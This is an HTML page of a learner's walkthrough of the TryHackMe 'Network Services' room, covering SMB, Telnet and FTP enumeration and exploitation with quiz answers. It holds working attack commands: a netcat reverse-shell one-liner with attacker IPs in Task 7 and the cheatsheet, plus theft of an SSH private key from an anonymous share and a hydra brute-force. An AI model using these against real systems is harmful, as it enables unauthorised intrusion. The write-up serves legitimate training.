@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"><head>
+
+<meta charset="utf-8">
+<meta name="generator" content="quarto-1.2.269">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+
+<meta name="author" content="hacker_newb">
+<meta name="dcterms.date" content="2023-07-27">
+
+<title>hacking newb - Network Services</title>
+<style>
+code{white-space: pre-wrap;}
+span.smallcaps{font-variant: small-caps;}
+div.columns{display: flex; gap: min(4vw, 1.5em);}
+div.column{flex: auto; overflow-x: auto;}
+div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+ul.task-list{list-style: none;}
+ul.task-list li input[type="checkbox"] {
+  width: 0.8em;
+  margin: 0 0.8em 0.2em -1.6em;
+  vertical-align: middle;
+}
+</style>
+
+
+<script src="../../site_libs/quarto-nav/quarto-nav.js"></script>
+<script src="../../site_libs/quarto-nav/headroom.min.js"></script>
+<script src="../../site_libs/clipboard/clipboard.min.js"></script>
+<script src="../../site_libs/quarto-search/autocomplete.umd.js"></script>
+<script src="../../site_libs/quarto-search/fuse.min.js"></script>
+<script src="../../site_libs/quarto-search/quarto-search.js"></script>
+<meta name="quarto:offset" content="../../">
+<script src="../../site_libs/quarto-html/quarto.js"></script>
+<script src="../../site_libs/quarto-html/popper.min.js"></script>
+<script src="../../site_libs/quarto-html/tippy.umd.min.js"></script>
+<script src="../../site_libs/quarto-html/anchor.min.js"></script>
+<link href="../../site_libs/quarto-html/tippy.css" rel="stylesheet">
+<link href="../../site_libs/quarto-html/quarto-syntax-highlighting-dark.css" rel="stylesheet" id="quarto-text-highlighting-styles">
+<script src="../../site_libs/bootstrap/bootstrap.min.js"></script>
+<link href="../../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
+<link href="../../site_libs/bootstrap/bootstrap.min.css" rel="stylesheet" id="quarto-bootstrap" data-mode="dark">
+<script id="quarto-search-options" type="application/json">{
+  "location": "navbar",
+  "copy-button": false,
+  "collapse-after": 3,
+  "panel-placement": "end",
+  "type": "overlay",
+  "limit": 20,
+  "language": {
+    "search-no-results-text": "No results",
+    "search-matching-documents-text": "matching documents",
+    "search-copy-link-title": "Copy link to search",
+    "search-hide-matches-text": "Hide additional matches",
+    "search-more-match-text": "more match in this document",
+    "search-more-matches-text": "more matches in this document",
+    "search-clear-button-title": "Clear",
+    "search-detached-cancel-button-title": "Cancel",
+    "search-submit-button-title": "Submit"
+  }
+}</script>
+
+
+<link rel="stylesheet" href="../../styles.css">
+</head>
+
+<body class="nav-fixed fullcontent">
+
+<div id="quarto-search-results"></div>
+  <header id="quarto-header" class="headroom fixed-top">
+    <nav class="navbar navbar-expand-lg navbar-dark ">
+      <div class="navbar-container container-fluid">
+      <div class="navbar-brand-container">
+    <a class="navbar-brand" href="../../index.html">
+    <span class="navbar-title">hacking newb</span>
+    </a>
+  </div>
+          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
+  <span class="navbar-toggler-icon"></span>
+</button>
+          <div class="collapse navbar-collapse" id="navbarCollapse">
+            <ul class="navbar-nav navbar-nav-scroll ms-auto">
+  <li class="nav-item">
+    <a class="nav-link" href="../../about.html">
+ <span class="menu-text">About</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="../../reference.html">
+ <span class="menu-text">References</span></a>
+  </li>  
+  <li class="nav-item compact">
+    <a class="nav-link" href="https://github.com/"><i class="bi bi-github" role="img">
+</i> 
+ <span class="menu-text"></span></a>
+  </li>  
+  <li class="nav-item compact">
+    <a class="nav-link" href="https://infosec.exchange/@hacker_newb"><i class="bi bi-mastodon" role="img">
+</i> 
+ <span class="menu-text"></span></a>
+  </li>  
+</ul>
+              <div id="quarto-search" class="" title="Search"></div>
+          </div> <!-- /navcollapse -->
+      </div> <!-- /container-fluid -->
+    </nav>
+</header>
+<!-- content -->
+<header id="title-block-header" class="quarto-title-block default page-columns page-full">
+  <div class="quarto-title-banner page-columns page-full">
+    <div class="quarto-title column-body">
+      <h1 class="title">Network Services</h1>
+                                <div class="quarto-categories">
+                <div class="quarto-category">TryHackMe</div>
+                <div class="quarto-category">Network</div>
+              </div>
+                  </div>
+  </div>
+    
+  
+  <div class="quarto-title-meta">
+
+      <div>
+      <div class="quarto-title-meta-heading">Author</div>
+      <div class="quarto-title-meta-contents">
+               <p>hacker_newb </p>
+            </div>
+    </div>
+      
+      <div>
+      <div class="quarto-title-meta-heading">Published</div>
+      <div class="quarto-title-meta-contents">
+        <p class="date">July 27, 2023</p>
+      </div>
+    </div>
+    
+      
+    </div>
+    
+  
+  </header><div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article page-navbar">
+<!-- sidebar -->
+<!-- margin-sidebar -->
+    
+<!-- main -->
+<main class="content quarto-banner-title-block" id="quarto-document-content">
+
+
+
+
+<p>Network Services. Explore a few common Network Service vulnerabilities and misconfigurations that you’re likely to find in CTFs, and some penetration test scenarios.</p>
+<p><img width="800" src="boxes.png"></p>
+<section id="task-2" class="level2">
+<h2 class="anchored" data-anchor-id="task-2"><span style="color:#ffcc66"> Task 2 </span></h2>
+<p>SMB is <em>Server Message Block</em> protocol, which is a client-server communication used for sharing access to files, printers, serial ports and other resources on a network.</p>
+<p>Servers make file systems and other resources (printers, named pipes, APIs) available to clients on the network. Client computers may have their own hard disks, but they also want access to the shared file systems and printers on the servers.</p>
+<ul>
+<li>The SMB protocol is known as a response-request protocol (many messages sent to establish a connection via TCP/IP)</li>
+</ul>
+<p>Once they have established a connection, clients can then send commands (SMBs) to the server that allow them to access to open files, read and write files, and generally do all the sort of things that you want to do with a file system but inside a network.</p>
+<ul>
+<li>runs on Windows (since Windows 95)</li>
+<li>Samba open source version</li>
+</ul>
+<p>Question: <em>What does SMB stand for?</em></p>
+<ul>
+<li>server message block</li>
+</ul>
+<p>Question: <em>What type of protocol is SMB?</em></p>
+<ul>
+<li>response-request</li>
+</ul>
+<p>Question: <em>What do clients connect to servers using?</em></p>
+<ul>
+<li>TCP/IP</li>
+</ul>
+<p>Question: <em>What systems does Samba run on?</em></p>
+<ul>
+<li>unix</li>
+</ul>
+</section>
+<section id="task-3" class="level2">
+<h2 class="anchored" data-anchor-id="task-3"><span style="color:#ffcc66"> Task 3 </span></h2>
+<p>Enumeration is the process of gathering information on a target in order to find potential attack vectors and aid in exploitation.</p>
+<ul>
+<li>This process is essential for an attack to be successful, as wasting time with exploits that either don’t work or can crash the system can be a waste of energy.</li>
+</ul>
+<p>Enumeration can be used to gather usernames, passwords, network information, hostnames, application data, services, or any other information that may be valuable to an attacker.</p>
+<ul>
+<li>there are SMB share drives on a server that can be connected to and used to view or transfer files.</li>
+<li>SMB can often be a great starting point for an attacker looking to discover sensitive information</li>
+</ul>
+<p>Port scanning is step 1 for enumeration, find out as much info as you can about the services, apps, structure and operating system of target machine.</p>
+<ul>
+<li>Enum4linux is a tool used to enumerate SMB shares on both Windows and Linux systems.</li>
+<li>a wrapper around the tools in the Samba package and makes it easy to quickly extract information from the target pertaining to SMB</li>
+<li>installed in Parrot OS and Kali</li>
+</ul>
+<table class="table">
+<thead>
+<tr class="header">
+<th>Tag</th>
+<th>Function</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><code>-U</code></td>
+<td>get userlist</td>
+</tr>
+<tr class="even">
+<td><code>-M</code></td>
+<td>get machine list</td>
+</tr>
+<tr class="odd">
+<td><code>-N</code></td>
+<td>namelist dump</td>
+</tr>
+<tr class="even">
+<td><code>-S</code></td>
+<td>get sharelist</td>
+</tr>
+<tr class="odd">
+<td><code>-P</code></td>
+<td>get password info</td>
+</tr>
+<tr class="even">
+<td><code>-G</code></td>
+<td>get group, members</td>
+</tr>
+<tr class="odd">
+<td><code>-a</code></td>
+<td><em>all of the above</em></td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>syntax: <code>enum4linux [OPTIONS] IP_ADDRESS</code></li>
+</ul>
+<p>Question: <em>Conduct an nmap scan of your choosing, How many ports are open?</em></p>
+<ul>
+<li><code>nmap -sS -sV IP_address</code></li>
+<li>3, SSH and Samba (2)</li>
+</ul>
+<p>Question: <em>What ports is SMB running on?</em></p>
+<ul>
+<li>139/445</li>
+</ul>
+<p>Question: <em>Let’s get started with Enum4Linux, conduct a full basic enumeration. For starters,what is the workgroup name?</em></p>
+<ul>
+<li>WORKGROUP</li>
+</ul>
+<p>Question: <em>What comes up as the name of the machine?</em></p>
+<ul>
+<li>hint: look under OS info</li>
+<li>POLOSMB</li>
+</ul>
+<p>Question: <em>What operating system version is running?</em></p>
+<ul>
+<li>6.1</li>
+</ul>
+<p>Question: <em>What share sticks out as something we might want to investigate?</em></p>
+<ul>
+<li>profiles</li>
+</ul>
+</section>
+<section id="task-4" class="level2">
+<h2 class="anchored" data-anchor-id="task-4"><span style="color:#ffcc66"> Task 4 </span></h2>
+<p>SMB Exploits.</p>
+<ul>
+<li>example: CVE-2017-7494 that can allow remote code execution by exploiting SMB</li>
+<li>likely to encounter a situation where the best way into a system is due to misconfigurations in the system</li>
+</ul>
+<p>We’re going to be exploiting anonymous SMB share access - <em>a common misconfiguration that can allow us to gain information that will lead to a shell</em>. We know from the scan where the SMB share location and the name of interesting SMB share.</p>
+<p>We need a client to access resources on servers, using SMBClient because it’s part of the default samba suite (installed in Parrot OS &amp; Kali).</p>
+<ul>
+<li>syntax: <code>smbclient // [IP]/[SHARE]  [TAG]</code></li>
+<li><code>-U [name]</code> to specify user</li>
+<li><code>-p [host]</code> specify port</li>
+</ul>
+<p>Question: <em>What would be the correct syntax to access an SMB share called “secret” as user “suit” on a machine with the IP 10.10.10.2 on the default port?</em></p>
+<ul>
+<li><code>smbclient //IP_address/secret -U suit -p 445</code></li>
+</ul>
+<p>Lets see if our interesting share has been configured to allow anonymous access, I.E it doesn’t require authentication to view the files. We can do this easily by:</p>
+<ul>
+<li>using username: Anonymous and not supplying a password</li>
+</ul>
+<p>The share we are interested in is <code>profiles</code>, so need to run:</p>
+<ul>
+<li><code>smbclient //IP_address/profiles</code> and just hit enter for password</li>
+</ul>
+<p>Question: <em>Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?</em></p>
+<ul>
+<li>my first command was <code>help</code> as I am not familiar with this system and found that you can use <code>l</code> to list files. You see a file “Working from home info.txt”. The <code>cat</code> command does not work, but you can use <code>? get</code> to see what this command does, and turns out that is the command we need.</li>
+<li>type: <code>get "Working From Home Information.txt"</code></li>
+<li>open a new tab in the terminal, <code>ls</code> and see the text file</li>
+<li><code>cat 'Workin&lt;tab&gt;'</code></li>
+<li>john cactus</li>
+</ul>
+<p>Question: <em>What service has been configured to allow him to work from home?</em></p>
+<ul>
+<li>ssh</li>
+</ul>
+<p>Question: <em>Okay! Now we know this, what directory on the share should we look in?</em></p>
+<ul>
+<li>.ssh</li>
+</ul>
+<p>Question: <em>This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?</em></p>
+<ul>
+<li>when we <code>l</code> we see ‘DH’ assigned to the ‘.ssh’ file, so <code>cd .ssh</code>, then <code>l</code></li>
+<li>hint: What is the default name of an SSH identity file?</li>
+<li><code>id_rsa</code></li>
+</ul>
+<p>Download the file using the <code>get</code> command. Then <code>chmod 600 id_rsa</code>.</p>
+<p>Question: <em>Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server. What is the smb.txt flag?</em></p>
+<ul>
+<li>The information we know: john cactus, workinggroup, profiles, ssh service.</li>
+<li><code>man ssh</code> , to remote login to service and point to a file <code>-i</code></li>
+<li><code>ssh -i id_rsa cactus@IP_address</code></li>
+<li><code>pwd</code> &gt; <code>ls</code> &gt; <code>cat smb.txt</code></li>
+<li>type ‘exit’ to quit</li>
+</ul>
+</section>
+<section id="task-5" class="level2">
+<h2 class="anchored" data-anchor-id="task-5"><span style="color:#ffcc66"> Task 5 </span></h2>
+<p>Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that’s hosting a telnet server.</p>
+<p>The telnet client will establish a connection with the server. The client will then become a virtual terminal- allowing you to interact with the remote host.</p>
+<ul>
+<li>Telnet sends all messages in clear text and has no specific security mechanisms.</li>
+<li>SSH has replaced many Telnet apps</li>
+</ul>
+<p>How it works:</p>
+<ol type="1">
+<li>user connect to the Telnet server protocol <code>telnet</code> prompt</li>
+<li>user executes command on server</li>
+</ol>
+<ul>
+<li>syntax: <code>telnet [IP] [PORT]</code></li>
+</ul>
+<p>Question: <em>What is Telnet?</em></p>
+<ul>
+<li>application protocol</li>
+</ul>
+<p>Question: <em>What has slowly replaced Telnet?</em></p>
+<ul>
+<li>ssh</li>
+</ul>
+<p>Question: <em>How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?</em></p>
+<ul>
+<li><code>telnet 10.10.10.3 23</code></li>
+</ul>
+<p>Question: <em>The lack of what, means that all Telnet communication is in plaintext?</em></p>
+<ul>
+<li>encryption</li>
+</ul>
+</section>
+<section id="task-6" class="level2">
+<h2 class="anchored" data-anchor-id="task-6"><span style="color:#ffcc66"> Task 6 </span></h2>
+<p>Telnet enumeration, vulnerabilities that could be potentially trivial to exploit don’t always jump out at us. For that reason, especially when it comes to enumerating network services, we need to be thorough in our method.</p>
+<p>Port scanning is always step 1. Telnet runs on port 23.</p>
+<p>Question: <em>How many ports are open on the target machine?</em></p>
+<ul>
+<li><code>nmap IP_address -p 23</code> says port is closed</li>
+<li>now check for ports <code>nmap IP_address -p 0-5000</code> and <code>nmap IP_address -p 5000-10000</code></li>
+<li>1</li>
+</ul>
+<p>Question: <em>What port is this?</em></p>
+<ul>
+<li>8012</li>
+</ul>
+<p>Question: <em>This port is unassigned, but still lists the protocol it’s using, what protocol is this?</em></p>
+<ul>
+<li>TCP</li>
+</ul>
+<p>Question: <em>Now re-run the nmap scan, without the -p- tag, how many ports show up as open?</em></p>
+<ul>
+<li>0</li>
+</ul>
+<p>It’s important to try every angle when enumerating, as the information you gather here will inform your exploitation stage.</p>
+<p>Question: <em>Based on the title returned to us, what do we think this port could be used for?</em></p>
+<ul>
+<li>we found the port that’s open, so we now connect to telnet <code>telnet IP_address 8012</code></li>
+<li>a backdoor</li>
+</ul>
+<p>Question: <em>Who could it belong to? Gathering possible usernames is an important step in enumeration.</em></p>
+<ul>
+<li>skidy</li>
+</ul>
+</section>
+<section id="task-7" class="level2">
+<h2 class="anchored" data-anchor-id="task-7"><span style="color:#ffcc66"> Task 7 </span></h2>
+<p>Telnet exploits, as it lacks encryption and poor access control. Check for exploits for Telnet client and sever systems.</p>
+<p>A CVE, short for Common Vulnerabilities and Exposures, is a list of publicly disclosed computer security flaws. When someone refers to a CVE, they usually mean the CVE ID number assigned to a security flaw.</p>
+<ul>
+<li>https://www.cvedetails.com/</li>
+<li>https://cve.mitre.org/</li>
+</ul>
+<p><strong>Reverse shel</strong>l is a piece of code or program which can be used to gain code or command execution on a device.</p>
+<ul>
+<li>Attacker IP: 10.10.10.1 , Listening port 4444</li>
+<li>Target IP: 10.10.10.30</li>
+<li>Attacker IP:port &lt;——- Target IP</li>
+</ul>
+<p>What we know: telnet service, port 8012, a backdoor, ‘skidy’ name.</p>
+<ul>
+<li>connect to telnet <code>telnet IP_address 8012</code></li>
+<li>skidy’s backdoor.</li>
+<li>no commands execute</li>
+</ul>
+<p>We are using the AttackBox so for the tcpdump:</p>
+<ul>
+<li>in the terminal open a new tab, paste <code>sudo tcpdump ip proto \\ icmp -i ens5</code> type as is</li>
+<li>back to telnet tab: <code>.RUN ping [AttackBox IP] -c 1</code></li>
+<li>in other terminal tab you see the pings, takes a few seconds</li>
+</ul>
+<p>Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let’s have some fun!</p>
+<p>Reverse shell payload suing msfvenom, which egenrates and encodes a netcat reverse shell</p>
+<ul>
+<li>in a new tab type the command, in the attackbox the ‘i’ button tells you which IP to use for reverse shell</li>
+<li>command: <code>msfvenom -p cmd/unix/reverse_netcat lhost=[local IP] lport=4444 R</code></li>
+<li><code>-p</code> payload</li>
+<li><code>lhost</code> = local host IP (your machine IP)</li>
+<li><code>lport</code> = local port to listen on (port on your machine)</li>
+<li><code>R</code> = export payload in raw format</li>
+</ul>
+<p>Question: <em>What word does the generated payload start with?</em></p>
+<ul>
+<li>mkfifo</li>
+</ul>
+<p>Now in same tab as the msfvenom, type <code>nc -lvp [listening port]</code>, it will start listening</p>
+<p>Question: <em>What would the command look like for the listening port we selected in our payload?</em></p>
+<ul>
+<li><code>nc -lvp 4444</code></li>
+</ul>
+<p>Now we copy &amp; paste the msfvenom payload into the telnet session and run it as a command.</p>
+<ul>
+<li>in a new tab run <code>nc -lvp 4444</code>, this starts listening</li>
+<li>copy and paste the msfvenom output (starts with mkfifo) into the telnet tab. Make sure you can hit enter for it to execute (tricky) <code>.RUN mkfifo /tmp/zxbtdxa; nc 10.10.177.6 4444 0&lt;/tmp/zxbtdxa | /bin/sh &gt;/tmp/zxbtdxa 2&gt;&amp;1; rm /tmp/zxbtdxa</code></li>
+<li>look at the tab with the <code>nc -lvp 4444</code> running, type <code>ls</code></li>
+</ul>
+<p>Question: <em>Success! What is the contents of flag.txt?</em></p>
+<ul>
+<li><code>cat flag.txt</code> to get the answer</li>
+</ul>
+</section>
+<section id="task-8" class="level2">
+<h2 class="anchored" data-anchor-id="task-8"><span style="color:#ffcc66"> Task 8 </span></h2>
+<p>File Transfer Protocol (FTP) is a protocol used to allow remote transfer of files over a network. It uses a client-server protocol model. The client initiates the connection with the server, server validates login credentials and opens the session.</p>
+<p>A FTP session has 2 channels:</p>
+<ul>
+<li>a command (control) channel while session is open</li>
+<li>a data channel</li>
+</ul>
+<p>Connection types:</p>
+<ul>
+<li>active FTP connection, client opens a port and listens (server does the connecting)</li>
+<li>passive FTP connection, server opens port and listens (client connects)</li>
+</ul>
+<p>Question: <em>What communications model does FTP use?</em></p>
+<ul>
+<li>client-server</li>
+</ul>
+<p>Question: <em>What’s the standard FTP port?</em></p>
+<ul>
+<li>21</li>
+</ul>
+<p>Question: <em>How many modes of FTP connection are there?</em></p>
+<ul>
+<li>2</li>
+</ul>
+</section>
+<section id="task-9" class="level2">
+<h2 class="anchored" data-anchor-id="task-9"><span style="color:#ffcc66"> Task 9 </span></h2>
+<p>We’re going to be exploiting an anonymous FTP login, to see what files we can access- and if they contain any information that might allow us to pop a shell on the system.</p>
+<ul>
+<li>common pathway in CTF challenges</li>
+<li>mimics a real-life careless implementation of FTP servers</li>
+</ul>
+<p>Start off by seeing if FTP is on system, in terminal type <code>ftp</code>. The <code>help</code> shows the commands such as <code>quit</code>.</p>
+<ul>
+<li><code>cwd</code> can be run in legacy FTP before authentication which is a bug</li>
+</ul>
+<p>Now run a nmap scan.</p>
+<p>Question: <em>How many ports are open on the target machine?</em></p>
+<ul>
+<li>2</li>
+</ul>
+<p>Question: <em>What port is ftp running on?</em></p>
+<ul>
+<li>21</li>
+</ul>
+<p>Question: <em>What variant of FTP is running on it?</em></p>
+<ul>
+<li>to answer this we need to run nmap again <code>nmap IP -sV</code></li>
+<li>vsftpd</li>
+</ul>
+<p>We know the type of FTP server, check if able to sign in anonymously to FTP server.</p>
+<ul>
+<li>FTP syntax <code>ftp IP</code></li>
+<li>enter anonymous and no password</li>
+</ul>
+<p>Question: <em>What is the name of the file in the anonymous FTP directory?</em></p>
+<ul>
+<li>PUBLIC_NOTICE.txt</li>
+</ul>
+<p>Question: <em>What do we think a possible username could be?</em></p>
+<ul>
+<li>in the tab with the ftp, <code>get PUBLIC_NOTICE.txt</code></li>
+<li>new tab <code>ls</code> and then <code>cat *.txt</code></li>
+<li>mike</li>
+</ul>
+</section>
+<section id="task-10" class="level2">
+<h2 class="anchored" data-anchor-id="task-10"><span style="color:#ffcc66"> Task 10 </span></h2>
+<p>FTP exploits due to no encryption to data and can be intercepted.</p>
+<ul>
+<li>Man-in-the-middle attack which can read sensitive data</li>
+</ul>
+<p>Information we have: mike, ftp, vsftpd, anonymous login. Let’s try to bruteforce the password using hydra.</p>
+<p>Hydra is a very fast online password cracking tool, which can perform rapid dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more. Hydra comes by default on both Parrot and Kali.</p>
+<ul>
+<li>Hydra syntax: <code>hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV IP_address ftp</code></li>
+<li></li>
+</ul>
+<p>Question: <em>What is the password for the user “mike”?</em></p>
+<ul>
+<li>password</li>
+</ul>
+<p>Now, let’s connect to the FTP server as this user using “ftp [IP]” and entering the credentials when prompted.</p>
+<ul>
+<li><code>ftp IP_address</code></li>
+<li>mike:password</li>
+</ul>
+<p>Question: <em>What is ftp.txt?</em></p>
+<ul>
+<li><code>ls</code> &gt; <code>get ftp.txt</code></li>
+<li>in other tab <code>cat ftp.txt</code> and see the flag</li>
+</ul>
+<hr>
+</section>
+<section id="section" class="level2">
+<h2 class="anchored" data-anchor-id="section"></h2>
+</section>
+<section id="section-1" class="level2">
+<h2 class="anchored" data-anchor-id="section-1"></h2>
+</section>
+<section id="cheatsheet" class="level1">
+<h1><span style="color:#ff6699"> Cheatsheet </span></h1>
+<section id="methodology" class="level3">
+<h3 class="anchored" data-anchor-id="methodology">Methodology</h3>
+<ol type="1">
+<li><code>nmap -sS -sV IP_address</code></li>
+<li><code>enum4linux -a IP_address</code></li>
+<li><code>smbclient //IP_address/share_name</code></li>
+<li><code>ls</code> &gt; <code>get "file-name.txt"</code> &gt; <code>cat 'file.txt '</code></li>
+<li><code>cd</code> <code>.ssh</code>&gt; <code>ls</code> &gt; <code>chmod 600 id_rsa</code> &gt; <code>ls -la id_rsa</code></li>
+<li><code>ssh -i id_rsa cactus@IP_address</code></li>
+<li><code>pwd</code> &gt; <code>ls</code> &gt; <code>cat smb.txt</code></li>
+</ol>
+</section>
+<section id="task-6-7" class="level3">
+<h3 class="anchored" data-anchor-id="task-6-7">Task 6, 7</h3>
+<ol type="1">
+<li><code>nmap IP_address -p 23</code></li>
+<li><code>nmap IP_address -p (ranges)</code></li>
+<li><code>telnet IP_address 8012</code></li>
+<li>new terminal tab <code>sudo tcpdump ip proto \\ icmp -i ens5</code></li>
+<li>telnet tab <code>.RUN ping [local IP] -c 1</code></li>
+<li>in a new tab <code>msfvenom -p cmd/unix/reverse_netcat lhost=[local IP] lport=4444 R</code></li>
+<li>same tab <code>nc -lvp 4444</code></li>
+<li>telnet tab <code>.RUN mkfifo /tmp/ujwrd; nc 10.10.74.144 4444 0&lt;/tmp/ujwrd | /bin/sh &gt;/tmp/ujwrd 2&gt;&amp;1; rm /tmp/ujwrd</code></li>
+</ol>
+</section>
+<section id="task-9-1" class="level3">
+<h3 class="anchored" data-anchor-id="task-9-1">Task 9</h3>
+<ol type="1">
+<li><code>nmap IP_address -p 21 -sV</code></li>
+<li><code>ftp IP</code> &gt; anonymous (no password)</li>
+<li><code>ls</code> &gt; <code>get PUBLIC_NOTICE.txt</code> &gt; other tab <code>cat *.txt</code></li>
+</ol>
+</section>
+<section id="task-10-1" class="level3">
+<h3 class="anchored" data-anchor-id="task-10-1">Task 10</h3>
+<ol type="1">
+<li><code>hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV IP_address ftp</code></li>
+<li>got password= password</li>
+<li><code>ftp IP_address</code> &gt; mike:password</li>
+<li><code>ls</code> &gt; <code>get ftp.txt</code> &gt; new tab <code>cat ftp.txt</code></li>
+</ol>
+</section>
+<section id="reference" class="level2">
+<h2 class="anchored" data-anchor-id="reference">Reference</h2>
+<ul>
+<li><a href="https://en.wikipedia.org/wiki/Server_Message_Block">Wiki - Server Message Block</a></li>
+<li><a href="https://www.aldeid.com/wiki/TryHackMe-Network-Services/SMB">TryHackMe Walkthrough</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Telnet">Wiki -Telnet</a></li>
+<li><a href="https://www.exploit-db.com/exploits/20745">FTP cwd bug</a></li>
+<li><a href="https://medium.com/dont-code-me-on-that/tryhackme-network-services-room-writeup-e00f88b7b599">Medium - Network Services walkthrough</a></li>
+</ul>
+
+
+</section>
+</section>
+
+</main> <!-- /main -->
+<script id="quarto-html-after-body" type="application/javascript">
+window.document.addEventListener("DOMContentLoaded", function (event) {
+  const toggleBodyColorMode = (bsSheetEl) => {
+    const mode = bsSheetEl.getAttribute("data-mode");
+    const bodyEl = window.document.querySelector("body");
+    if (mode === "dark") {
+      bodyEl.classList.add("quarto-dark");
+      bodyEl.classList.remove("quarto-light");
+    } else {
+      bodyEl.classList.add("quarto-light");
+      bodyEl.classList.remove("quarto-dark");
+    }
+  }
+  const toggleBodyColorPrimary = () => {
+    const bsSheetEl = window.document.querySelector("link#quarto-bootstrap");
+    if (bsSheetEl) {
+      toggleBodyColorMode(bsSheetEl);
+    }
+  }
+  toggleBodyColorPrimary();  
+  const icon = "";
+  const anchorJS = new window.AnchorJS();
+  anchorJS.options = {
+    placement: 'right',
+    icon: icon
+  };
+  anchorJS.add('.anchored');
+  const clipboard = new window.ClipboardJS('.code-copy-button', {
+    target: function(trigger) {
+      return trigger.previousElementSibling;
+    }
+  });
+  clipboard.on('success', function(e) {
+    // button target
+    const button = e.trigger;
+    // don't keep focus
+    button.blur();
+    // flash "checked"
+    button.classList.add('code-copy-button-checked');
+    var currentTitle = button.getAttribute("title");
+    button.setAttribute("title", "Copied!");
+    let tooltip;
+    if (window.bootstrap) {
+      button.setAttribute("data-bs-toggle", "tooltip");
+      button.setAttribute("data-bs-placement", "left");
+      button.setAttribute("data-bs-title", "Copied!");
+      tooltip = new bootstrap.Tooltip(button, 
+        { trigger: "manual", 
+          customClass: "code-copy-button-tooltip",
+          offset: [0, -8]});
+      tooltip.show();    
+    }
+    setTimeout(function() {
+      if (tooltip) {
+        tooltip.hide();
+        button.removeAttribute("data-bs-title");
+        button.removeAttribute("data-bs-toggle");
+        button.removeAttribute("data-bs-placement");
+      }
+      button.setAttribute("title", currentTitle);
+      button.classList.remove('code-copy-button-checked');
+    }, 1000);
+    // clear code selection
+    e.clearSelection();
+  });
+  function tippyHover(el, contentFn) {
+    const config = {
+      allowHTML: true,
+      content: contentFn,
+      maxWidth: 500,
+      delay: 100,
+      arrow: false,
+      appendTo: function(el) {
+          return el.parentElement;
+      },
+      interactive: true,
+      interactiveBorder: 10,
+      theme: 'quarto',
+      placement: 'bottom-start'
+    };
+    window.tippy(el, config); 
+  }
+  const noterefs = window.document.querySelectorAll('a[role="doc-noteref"]');
+  for (var i=0; i<noterefs.length; i++) {
+    const ref = noterefs[i];
+    tippyHover(ref, function() {
+      // use id or data attribute instead here
+      let href = ref.getAttribute('data-footnote-href') || ref.getAttribute('href');
+      try { href = new URL(href).hash; } catch {}
+      const id = href.replace(/^#\/?/, "");
+      const note = window.document.getElementById(id);
+      return note.innerHTML;
+    });
+  }
+  const findCites = (el) => {
+    const parentEl = el.parentElement;
+    if (parentEl) {
+      const cites = parentEl.dataset.cites;
+      if (cites) {
+        return {
+          el,
+          cites: cites.split(' ')
+        };
+      } else {
+        return findCites(el.parentElement)
+      }
+    } else {
+      return undefined;
+    }
+  };
+  var bibliorefs = window.document.querySelectorAll('a[role="doc-biblioref"]');
+  for (var i=0; i<bibliorefs.length; i++) {
+    const ref = bibliorefs[i];
+    const citeInfo = findCites(ref);
+    if (citeInfo) {
+      tippyHover(citeInfo.el, function() {
+        var popup = window.document.createElement('div');
+        citeInfo.cites.forEach(function(cite) {
+          var citeDiv = window.document.createElement('div');
+          citeDiv.classList.add('hanging-indent');
+          citeDiv.classList.add('csl-entry');
+          var biblioDiv = window.document.getElementById('ref-' + cite);
+          if (biblioDiv) {
+            citeDiv.innerHTML = biblioDiv.innerHTML;
+          }
+          popup.appendChild(citeDiv);
+        });
+        return popup.innerHTML;
+      });
+    }
+  }
+});
+</script>
+</div> <!-- /content -->
+
+
+
+</body></html>
